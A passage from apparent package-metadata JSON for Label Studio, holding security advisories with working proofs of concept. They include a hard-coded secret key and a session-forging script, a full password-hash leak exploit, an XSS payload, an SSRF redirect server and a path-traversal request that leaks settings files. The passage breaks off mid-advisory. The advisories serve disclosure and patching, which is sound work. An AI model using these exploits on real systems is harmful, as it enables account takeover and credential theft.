elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.6.post2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.6.post2/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.2.4)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (==4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","murmurhash (==1.0.2)","numpy (==1.17.4)","plac (==0.9.6)","preshed (==2.0.1)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.10)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.6.post2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"2dbf8327c134ac9aa1ff31a80bfb2c35bf686ea21e505f22cd742035df493ddc","md5":"0e6dc450418c84c0ce4181ce00f7a2db","sha256":"b60fb36cff1de116b2b25f78d8c8f50020bf52bbf772c3e53e08b60b91298e33"},"downloads":-1,"filename":"label_studio-0.4.6.post2-py3-none-any.whl","has_sig":false,"md5_digest":"0e6dc450418c84c0ce4181ce00f7a2db","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":7348617,"upload_time":"2020-02-12T21:54:57","upload_time_iso_8601":"2020-02-12T21:54:57.080626Z","url":"https://files.pythonhosted.org/packages/2d/bf/8327c134ac9aa1ff31a80bfb2c35bf686ea21e505f22cd742035df493ddc/label_studio-0.4.6.post2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"35d0f79f45fb8dd2a58f713226d0a1bdf40338d166449d84f7d35608cfce27ea","md5":"8818737122e398cec96b02a65076149d","sha256":"dfa3badfaec44501b6bff5796ec528ae38699ac517dda6a84655ac4bc8f24e31"},"downloads":-1,"filename":"label-studio-0.4.6.post2.tar.gz","has_sig":false,"md5_digest":"8818737122e398cec96b02a65076149d","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":7272855,"upload_time":"2020-02-12T21:55:02","upload_time_iso_8601":"2020-02-12T21:55:02.663952Z","url":"https://files.pythonhosted.org/packages/35/d0/f79f45fb8dd2a58f713226d0a1bdf40338d166449d84f7d35608cfce27ea/label-studio-0.4.6.post2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': 